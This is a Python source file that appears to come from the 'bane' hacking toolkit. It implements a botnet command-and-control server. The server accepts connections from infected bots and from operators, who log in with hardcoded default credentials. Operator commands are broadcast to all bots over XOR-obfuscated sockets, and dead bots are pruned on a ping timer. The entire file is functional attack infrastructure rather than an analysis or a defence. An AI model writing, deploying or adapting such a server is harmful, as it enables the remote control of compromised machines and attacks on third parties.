import socket,sys,os,time
import threading
from bane.cryptographers.xor import XOR



class Botnet_C_C_Server:

    banner="\r\n\r\n\tWelcome To Bane's C&C server !\r\n\r\n"
    username_prompt='\r\nLogin: '
    password_prompt="\r\npassword: "
    user_prompt="{}@bane-C&C:$"

    @staticmethod
    def send_data(data,sock,xor_key=None,read_output=True):
        data='{}'.format(data)
        if xor_key not in [None,''] and data.strip()!='':
            data= XOR.encrypt(data,xor_key)
        sock.send(data.encode())
        if read_output==True:
            return Botnet_C_C_Server.read_data(sock,xor_key=xor_key)

    @staticmethod
    def read_data(sock,xor_key=None):
        data=''
        while True:
            try:
                d=sock.recv(1024).decode()
                if xor_key not in [None,''] and d.strip()!='':
                    d= XOR.encrypt(d,xor_key)
                if d.strip()=='':
                    break
                data+=d
                if '\n' in data:
                    break
            except Exception as ex:
                break
        return data.strip()

    def process_cmd(self,cmd,user_socket,user):
        self.send_command(cmd,user_socket,user,)

    def ping(self):
        while True:
            try:
                time.sleep(self.pings_interval)
                self.send_command(self.ping_command,None,None,is_ping=True)
            except:
                break

    def login(self,**kwargs):
        if kwargs in self.users:
            return True
        return False

    def send_command(self,command,user_socket,user,is_ping=False):
        dead_bots=[]
        while True:
            time.sleep(0.1)
            if self.sending==False:
                break
        self.sending=True
        for client_socket in self.bots_list:
            try:
                Botnet_C_C_Server.send_data(command,client_socket,xor_key=self.bots_encryption_key)
            except Exception as ex:
                #print(ex)#raise Exception(ex)
                try:
                    client_socket.close()
                except:
                    pass
                dead_bots.append(client_socket)
        for x in dead_bots:
            self.bots_list.remove(x)
        self.sending=False
        if is_ping==False:
            Botnet_C_C_Server.send_data('\r\nCommand was sent to {} bots\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip()).strip(),user_socket,xor_key=self.users_encryption_key)

    def handle_bot(self,client_socket):
        try:
            for command in self.initial_commands_list:
                Botnet_C_C_Server.send_data(command,client_socket,xor_key=self.bots_encryption_key,read_output=False)
        except Exception as exx:
            pass#raise Exception(exx)


    def handle_user(self,client_socket):
        try:
            banner=Botnet_C_C_Server.banner+Botnet_C_C_Server.username_prompt
            user=Botnet_C_C_Server.send_data(banner,client_socket,xor_key=self.users_encryption_key)
            pwd=Botnet_C_C_Server.send_data(Botnet_C_C_Server.password_prompt,client_socket,xor_key=self.users_encryption_key)
            if self.login(username=user,password=pwd)==True:
                snd='\r\n\r\nTotal Bots: {}\r\n\r\n{}'.format(len(self.bots_list),Botnet_C_C_Server.user_prompt.format(user).strip())
                if self.users_encryption_key not in ['',None]:
                    snd=XOR.encrypt(snd,self.users_encryption_key)
                client_socket.send(snd.encode())
                while True:
                    data=Botnet_C_C_Server.read_data(client_socket,xor_key=self.users_encryption_key)
                    self.process_cmd(data.strip(),client_socket,user)                       
            else:
                client_socket.send('login failed'.encode())
                client_socket.close()
        except Exception as ex:
            pass
        try:
            client_socket.close()
        except:
            pass

    def __init__(self,users_host='0.0.0.0',ping_command='',pings_interval=5,threads_daemon=False,users_encryption_key=None,users_port=22222,bots_host='0.0.0.0',bots_port=7777,socket_buffer_size=4096,max_users=5,max_bots=100,logs=False,initial_commands_list=[],bots_encryption_key=None,users=[{"username":"ala_sensei","password":"ala_sensei"}]):
        self.ping_command=ping_command
        self.bots_list=[]
        self.bots_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.bots_server.bind((bots_host, bots_port))
        self.bots_server.listen(max_bots) 
        self.users_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.users_server.bind((users_host, users_port))
        self.users_server.listen(max_users) 
        self.sending=False
        self.pings_interval=pings_interval
        self.users=users
        self.threads_daemon=threads_daemon
        self.bots_encryption_key=bots_encryption_key
        self.users_encryption_key=users_encryption_key
        self.logs=logs
        self.initial_commands_list=initial_commands_list
        self.socket_buffer_size=socket_buffer_size
        if self.logs==True:
            print("[*] Listening for bots on {}:{}".format(bots_host,bots_port))
            print("[*] Listening for users on {}:{}".format(users_host,users_port))
        t1 = threading.Thread(target=self.run_bots_server)
        t1.threads_daemon=self.threads_daemon
        t1.start()
        t2 = threading.Thread(target=self.run_users_server)
        t2.threads_daemon=self.threads_daemon
        t2.start()
        t3 = threading.Thread(target=self.ping)
        t3.threads_daemon=self.threads_daemon
        t3.start()
    
    def run_bots_server(self):
        while True:
            client, addr = self.bots_server.accept()
            if self.logs==True:
                print("[*] Accepted connection from: {}:{}".format(addr[0],addr[1]))
            self.bots_list.append(client)
            client_handler = threading.Thread(target=self.handle_bot, args=(client,))
            client_handler.threads_daemon=self.threads_daemon
            client_handler.start()
    

    def run_users_server(self):
        while True:
            client, addr = self.users_server.accept()
            if self.logs==True:
                print("[*] Accepted connection from: {}:{}".format(addr[0],addr[1]))
            client_handler = threading.Thread(target=self.handle_user, args=(client,))
            client_handler.threads_daemon=self.threads_daemon
            client_handler.start()
    
    def kill(self):
        l = []
        for x in self.__dict__:
            self.__dict__[x] = None
            l.append(x)
        for x in l:
            delattr(self, x)
        #sys.exit()